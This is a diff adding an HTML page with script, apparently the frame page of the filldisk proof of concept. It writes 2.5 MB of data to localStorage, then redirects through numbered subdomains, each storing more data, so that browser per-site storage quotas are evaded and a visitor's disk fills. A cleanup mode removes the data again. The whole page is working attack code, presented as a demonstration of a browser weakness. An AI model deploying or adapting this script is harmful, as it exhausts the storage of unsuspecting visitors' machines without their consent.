@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+</head>
+<body>
+<script>
+
+  window.stop()
+
+  /**
+   * Returns a new String that contains `count` copies of `string`
+   * concatenated together.
+   *
+   * Some code adapted from: arty.name/localstorage.html
+   */
+
+  function repeat(string, count) {
+    var array = []
+    while (count--) {
+      array.push(string)
+    }
+    return array.join('')
+  }
+
+  (function () {
+
+    /**
+     * Get the subdomain "number" of this iframe.
+     * Example: http://5.filldisk.com  -->  5
+     * @type {Number}
+     */
+
+    var frameNum = parseInt(window.location.hostname.match(/^([^.]+)\./i)[1])
+
+    /**
+     * If true, reclaim the space we used.
+     * @type {Boolean}
+     */
+
+    var shouldFree = window.location.search.match(/free=(\w+)/i)[1] == 'true'
+
+    /**
+     * The highest subdomain that we need to reclaim space from.
+     * We can stop after we reach this domain.
+     * @type {Number}
+     */
+
+    var highestSubdomain = parseInt(window.location.search.match(/highest=(\d+)/i)[1])
+
+    /**
+     * Generate a 2.5 MB string. This st
+     */
+
+    var n10b = '0123456789'
+    var n100b = repeat(n10b, 10)
+    var n1kb = repeat(n100b, 10)
+    var n10kb = repeat(n1kb, 10)
+    var n100kb = repeat(n10kb, 10)
+    var n2500kb = repeat(n100kb, 25)
+
+    /**
+     * Use 5 MB of localStorage space.
+     * Used space is double the size of the string because
+     * JS uses UTF-16 Strings.
+     */
+
+    try {
+      if (shouldFree) {
+        localStorage.removeItem('filldisk')
+      } else {
+        localStorage['filldisk'] = n2500kb
+      }
+    } catch (e) {
+      console.error('local storage exception')
+      return
+    }
+
+    /**
+     * Notify the main frame about what subdomain we are on.
+     */
+
+    window.parent.postMessage(frameNum, '*')
+
+
+    /**
+     * Redirect to the next subdomain!
+     */
+    if (!shouldFree || frameNum < highestSubdomain) {
+      window.location = 'http://' + (frameNum + 1) + '.filldisk.com/frame.html?free=' + shouldFree + '&highest=' + highestSubdomain
+    }
+
+  })()
+
+</script>
+</body>
+</html>
